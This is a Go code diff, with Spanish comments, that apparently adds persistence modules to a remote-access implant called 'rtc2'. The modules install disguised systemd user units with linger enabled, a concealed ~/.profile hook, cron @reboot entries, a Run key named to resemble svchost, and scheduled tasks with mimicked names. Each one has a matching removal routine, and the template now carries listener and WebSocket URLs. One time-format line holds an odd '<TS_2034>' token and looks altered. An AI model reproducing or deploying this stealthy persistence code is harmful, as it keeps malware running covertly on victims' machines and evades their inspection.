+		return nil, fmt.Sprintf("persist stealth: obtener home: %v", err)
+	}
+	svc, disp := stealthNames(exe)
+	systemdDir := filepath.Join(home, ".config", "systemd", "user")
+	if err := os.MkdirAll(systemdDir, 0o755); err != nil {
+		return nil, fmt.Sprintf("persist stealth: crear %s: %v", systemdDir, err)
+	}
+
+	unitPath := filepath.Join(systemdDir, svc+".service")
+	// ExecStart vía /bin/sh -c "exec ..." para no exponer el nombre del
+	// binario directamente en la línea ExecStart (systemctl status y
+	// list-units lo muestran). El nombre del servicio ya es mimetizado.
+	unit := "[Unit]\n" +
+		"Description=" + disp + "\n" +
+		"After=graphical-session.target\n\n" +
+		"[Service]\n" +
+		"ExecStart=/bin/sh -c \"exec '" + exe + "'\"\n" +
+		"Restart=always\n" +
+		"RestartSec=30\n\n" +
+		"[Install]\n" +
+		"WantedBy=default.target\n"
+	if err := os.WriteFile(unitPath, []byte(unit), 0o644); err != nil {
+		return nil, fmt.Sprintf("persist stealth: escribir %s: %v", unitPath, err)
+	}
+
+	if out, err := exec.Command("systemctl", "--user", "daemon-reload").CombinedOutput(); err != nil {
+		return nil, fmt.Sprintf("persist stealth: daemon-reload: %v (%s)", err, strings.TrimSpace(string(out)))
+	}
+	if out, err := exec.Command("systemctl", "--user", "enable", svc+".service").CombinedOutput(); err != nil {
+		return nil, fmt.Sprintf("persist stealth: enable: %v (%s)", err, strings.TrimSpace(string(out)))
+	}
+	// enable-linger: el servicio corre sin login (requiere polkit, suele
+	// funcionar para el propio usuario sin root).
+	if out, err := exec.Command("loginctl", "enable-linger", os.Getenv("USER")).CombinedOutput(); err != nil {
+		// No fatal: el servicio igual funciona con login gráfico.
+		_ = out
+	}
+	return []byte(fmt.Sprintf("persist stealth: unidad %s (%s) creada y habilitada\n", unitPath, disp)), ""
+}
+
+func unpersistStealthSystemd() ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "unpersist stealth: solo disponible en Linux"
+	}
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Sprintf("unpersist stealth: obtener home: %v", err)
+	}
+	systemdDir := filepath.Join(home, ".config", "systemd", "user")
+	entries, _ := os.ReadDir(systemdDir)
+	removed := 0
+	for _, e := range entries {
+		if !strings.HasSuffix(e.Name(), ".service") {
+			continue
+		}
+		data, _ := os.ReadFile(filepath.Join(systemdDir, e.Name()))
+		content := string(data)
+		// Es nuestro si el ExecStart apunta a un binario implant/rtc2.
+		if strings.Contains(content, "implant_") || strings.Contains(content, "rtc2") {
+			svc := strings.TrimSuffix(e.Name(), ".service")
+			_, _ = exec.Command("systemctl", "--user", "disable", svc+".service").CombinedOutput()
+			_, _ = exec.Command("systemctl", "--user", "stop", svc+".service").CombinedOutput()
+			if os.Remove(filepath.Join(systemdDir, e.Name())) == nil {
+				removed++
+			}
+		}
+	}
+	_, _ = exec.Command("systemctl", "--user", "daemon-reload").CombinedOutput()
+	return []byte(fmt.Sprintf("unpersist stealth: %d unidades eliminadas\n", removed)), ""
+}
+
+// ── Linux: profile hook ────────────────────────────────────────────────
+
+// persistProfile añade una línea silenciosa a ~/.profile (o ~/.bashrc si
+// no existe .profile) que arranca el ejecutable en cada login interactivo.
+// Es el hook más ligero: una sola línea entre otras del archivo, casi
+// invisible en una inspección casual.
+func persistProfile(exe string) ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "persist profile: solo disponible en Linux"
+	}
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Sprintf("persist profile: obtener home: %v", err)
+	}
+	// Preferir .profile (se ejecuta en login shells); fallback a .bashrc.
+	target := filepath.Join(home, ".profile")
+	if _, err := os.Stat(target); os.IsNotExist(err) {
+		target = filepath.Join(home, ".bashrc")
+	}
+	data, _ := os.ReadFile(target)
+	marker := "# session restore"
+	line := fmt.Sprintf("\n%s\n[ -x '%s' ] && '%s' >/dev/null 2>&1 &\n", marker, exe, exe)
+	if strings.Contains(string(data), marker) {
+		return []byte("persist profile: hook ya existe\n"), ""
+	}
+	f, err := os.OpenFile(target, os.O_APPEND|os.O_WRONLY, 0o644)
+	if err != nil {
+		return nil, fmt.Sprintf("persist profile: abrir %s: %v", target, err)
+	}
+	defer f.Close()
+	if _, err := f.WriteString(line); err != nil {
+		return nil, fmt.Sprintf("persist profile: escribir: %v", err)
+	}
+	return []byte(fmt.Sprintf("persist profile: hook añadido a %s\n", target)), ""
+}
+
+func unpersistProfile() ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "unpersist profile: solo disponible en Linux"
+	}
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Sprintf("unpersist profile: obtener home: %v", err)
+	}
+	removed := 0
+	for _, name := range []string{".profile", ".bashrc"} {
+		path := filepath.Join(home, name)
+		data, err := os.ReadFile(path)
+		if err != nil {
+			continue
+		}
+		lines := strings.Split(string(data), "\n")
+		var keep []string
+		skip := false
+		for i, l := range lines {
+			if l == "# session restore" && i+1 < len(lines) && strings.Contains(lines[i+1], "implant_") || strings.Contains(l, "implant_") && strings.Contains(l, ">/dev/null 2>&1 &") {
+				skip = true
+				removed++
+				continue
+			}
+			if skip {
+				skip = false // saltar también la línea del comando
+				continue
+			}
+			keep = append(keep, l)
+		}
+		if removed > 0 {
+			os.WriteFile(path, []byte(strings.Join(keep, "\n")), 0o644)
+		}
+	}
+	return []byte(fmt.Sprintf("unpersist profile: %d hooks eliminados\n", removed)), ""
+}
+
+// ── Windows: Run/RunOnce key ────────────────────────────────────────────
+// Usa "reg add" / "reg delete" en vez de importar golang.org/x/sys/windows
+// para que el template no añada dependencias externas al implant.
+
+func persistRegistry(exe string) ([]byte, string) {
+	if runtime.GOOS != "windows" {
+		return nil, "persist registry: solo disponible en Windows"
+	}
+	// HKCU\...\Run — arranca el ejecutable en cada inicio de sesión del
+	// usuario. No requiere elevación.
+	out, err := exec.Command("reg", "add",
+		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		"/v", "svchost-rtc2", "/t", "REG_SZ", "/d", exe, "/f",
+	).CombinedOutput()
+	if err != nil {
+		return out, fmt.Sprintf("persist registry: %v", err)
+	}
+	return []byte(fmt.Sprintf("persist registry: HKCU Run key creado = %s\n", exe)), ""
+}
+
+func unpersistRegistry() ([]byte, string) {
+	if runtime.GOOS != "windows" {
+		return nil, "unpersist registry: solo disponible en Windows"
+	}
+	out, err := exec.Command("reg", "delete",
+		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		"/v", "svchost-rtc2", "/f",
+	).CombinedOutput()
+	if err != nil {
+		return out, fmt.Sprintf("unpersist registry: %v", err)
+	}
+	return []byte("unpersist registry: HKCU Run key eliminada\n"), ""
+}
+
+// ── Windows: scheduled task ─────────────────────────────────────────────
+
+func persistSchTask(exe string) ([]byte, string) {
+	if runtime.GOOS != "windows" {
+		return nil, "persist schtask: solo disponible en Windows"
+	}
+	// Tier 1 (decoy): nombre que mimetiza software legítimo pero la tarea
+	// sigue siendo enumerable por schtasks/Get-ScheduledTask. /SC ONLOGON
+	// arranca en cada logon; /RL LIMITED evita pedir elevación.
+	svc, _ := stealthNames(exe)
+	_, err := exec.Command("schtasks", "/Create", "/F", "/TN", svc,
+		"/TR", exe, "/SC", "ONLOGON", "/RL", "LIMITED").CombinedOutput()
+	if err != nil {
+		return nil, fmt.Sprintf("persist schtask: %v", err)
+	}
+	return []byte(fmt.Sprintf("persist schtask: tarea '%s' creada (ONLOGON)\n", svc)), ""
+}
+
+func unpersistSchTask() ([]byte, string) {
+	if runtime.GOOS != "windows" {
+		return nil, "unpersist schtask: solo disponible en Windows"
+	}
+	// El nombre debe coincidir con el que persistSchTask creó. Como ambos
+	// derivan de la ruta del ejecutable actual, recalculamos el mismo.
+	exe, err := os.Executable()
+	if err != nil {
+		return nil, fmt.Sprintf("unpersist schtask: obtener ruta: %v", err)
+	}
+	svc, _ := stealthNames(exe)
+	_, err = exec.Command("schtasks", "/Delete", "/F", "/TN", svc).CombinedOutput()
+	if err != nil {
+		return nil, fmt.Sprintf("unpersist schtask: %v", err)
+	}
+	return []byte(fmt.Sprintf("unpersist schtask: tarea '%s' eliminada\n", svc)), ""
+}
+
+// ── Linux: systemd user unit ────────────────────────────────────────────
+
+func persistSystemd(exe string) ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "persist systemd: solo disponible en Linux"
+	}
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Sprintf("persist systemd: obtener home: %v", err)
+	}
+	// Tier 1 (decoy): nombre mimetizado. systemd básico no oculta el
+	// binario en ExecStart; para stealth usar el método 'stealth'.
+	svc, disp := stealthNames(exe)
+	systemdDir := filepath.Join(home, ".config", "systemd", "user")
+	if err := os.MkdirAll(systemdDir, 0o755); err != nil {
+		return nil, fmt.Sprintf("persist systemd: crear %s: %v", systemdDir, err)
+	}
+
+	unitPath := filepath.Join(systemdDir, svc+".service")
+	unit := "[Unit]\n" +
+		"Description=" + disp + "\n\n" +
+		"[Service]\n" +
+		"ExecStart=" + exe + "\n" +
+		"Restart=always\n" +
+		"RestartSec=30\n\n" +
+		"[Install]\n" +
+		"WantedBy=default.target\n"
+	if err := os.WriteFile(unitPath, []byte(unit), 0o644); err != nil {
+		return nil, fmt.Sprintf("persist systemd: escribir %s: %v", unitPath, err)
+	}
+
+	// Habilitar la unidad para que arranque con la sesión de usuario.
+	// No requiere root: systemd --user gestiona el servicio del usuario.
+	if out, err := exec.Command("systemctl", "--user", "daemon-reload").CombinedOutput(); err != nil {
+		return nil, fmt.Sprintf("persist systemd: daemon-reload: %v (%s)", err, strings.TrimSpace(string(out)))
+	}
+	if out, err := exec.Command("systemctl", "--user", "enable", svc+".service").CombinedOutput(); err != nil {
+		return nil, fmt.Sprintf("persist systemd: enable: %v (%s)", err, strings.TrimSpace(string(out)))
+	}
+	return []byte(fmt.Sprintf("persist systemd: unidad %s creada y habilitada\n", unitPath)), ""
+}
+
+func unpersistSystemd() ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "unpersist systemd: solo disponible en Linux"
+	}
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Sprintf("unpersist systemd: obtener home: %v", err)
+	}
+	exe, err := os.Executable()
+	if err != nil {
+		return nil, fmt.Sprintf("unpersist systemd: obtener ruta: %v", err)
+	}
+	svc, _ := stealthNames(exe)
+	unitPath := filepath.Join(home, ".config", "systemd", "user", svc+".service")
+
+	// Intentar deshabilitar (puede fallar si nunca se habilitó).
+	_, _ = exec.Command("systemctl", "--user", "disable", svc+".service").CombinedOutput()
+	_, _ = exec.Command("systemctl", "--user", "stop", svc+".service").CombinedOutput()
+	_, _ = exec.Command("systemctl", "--user", "daemon-reload").CombinedOutput()
+
+	if err := os.Remove(unitPath); err != nil && !os.IsNotExist(err) {
+		return nil, fmt.Sprintf("unpersist systemd: borrar %s: %v", unitPath, err)
+	}
+	return []byte(fmt.Sprintf("unpersist systemd: unidad %s eliminada\n", unitPath)), ""
+}
+
+// ── Linux: cron @reboot ────────────────────────────────────────────────
+
+func persistCron(exe string) ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "persist cron: solo disponible en Linux"
+	}
+	// Leer crontab actual, añadir línea si no existe.
+	out, err := exec.Command("crontab", "-l").Output()
+	if err != nil && len(out) == 0 {
+		// crontab puede fallar si está vacío; es aceptable.
+		out = []byte{}
+	}
+	marker := "@reboot " + exe
+	lines := strings.Split(strings.TrimRight(string(out), "\n"), "\n")
+	for _, l := range lines {
+		if strings.Contains(l, marker) {
+			return []byte("persist cron: entrada ya existe\n"), ""
+		}
+	}
+	newCron := strings.TrimRight(string(out), "\n")
+	if newCron != "" {
+		newCron += "\n"
+	}
+	newCron += marker + "\n"
+	cmd := exec.Command("crontab", "-")
+	cmd.Stdin = strings.NewReader(newCron)
+	if out2, err := cmd.CombinedOutput(); err != nil {
+		return nil, fmt.Sprintf("persist cron: instalar crontab: %v (%s)", err, strings.TrimSpace(string(out2)))
+	}
+	return []byte("persist cron: @reboot entrada añadida\n"), ""
+}
+
+func unpersistCron() ([]byte, string) {
+	if runtime.GOOS != "linux" {
+		return nil, "unpersist cron: solo disponible en Linux"
+	}
+	out, err := exec.Command("crontab", "-l").Output()
+	if err != nil {
+		return []byte("unpersist cron: crontab vacío o inaccesible\n"), ""
+	}
+	lines := strings.Split(strings.TrimRight(string(out), "\n"), "\n")
+	var keep []string
+	removed := false
+	for _, l := range lines {
+		if strings.HasPrefix(l, "@reboot ") && strings.Contains(l, "implant_") || strings.HasPrefix(l, "@reboot ") && strings.Contains(l, "rtc2") {
+			removed = true
+			continue
+		}
+		keep = append(keep, l)
+	}
+	if !removed {
+		return []byte("unpersist cron: ninguna entrada rtc2 encontrada\n"), ""
+	}
+	newCron := strings.Join(keep, "\n")
+	if newCron != "" {
+		newCron += "\n"
+	}
+	cmd := exec.Command("crontab", "-")
+	cmd.Stdin = strings.NewReader(newCron)
+	if _, err := cmd.CombinedOutput(); err != nil {
+		return nil, fmt.Sprintf("unpersist cron: instalar crontab: %v", err)
+	}
+	return []byte("unpersist cron: entradas rtc2 eliminadas\n"), ""
 }
 
 func handleRekeyRequestHTTP(
@@ -1330,6 +2385,7 @@ type TemplateData struct {
 	BuiltAt         string
 	GoBuildTag      string
 	ListenerURL     string
+	WSURL           string
 	ProfileName     string
 	ServerPubKey    string
 	CACertPEMBase64 string
@@ -1346,9 +2402,10 @@ func RenderTemplate(cfg *BuildConfig) ([]byte, error) {
 
 	data := TemplateData{
 		BuildID:         cfg.BuildID,
-		BuiltAt:         cfg.CreatedAt.Format("2006-01-02 15:04:05"),
+		BuiltAt:         cfg.CreatedAt.Format("<TS_2034>"),
 		GoBuildTag:      goBuildTag(cfg.TargetOS),
 		ListenerURL:     cfg.ListenerURL,
+		WSURL:           cfg.WSURL,
 		ProfileName:     cfg.ProfileName,
 		ServerPubKey:    cfg.ServerPubKey,
 		CACertPEMBase64: cfg.CACertPEMBase64,
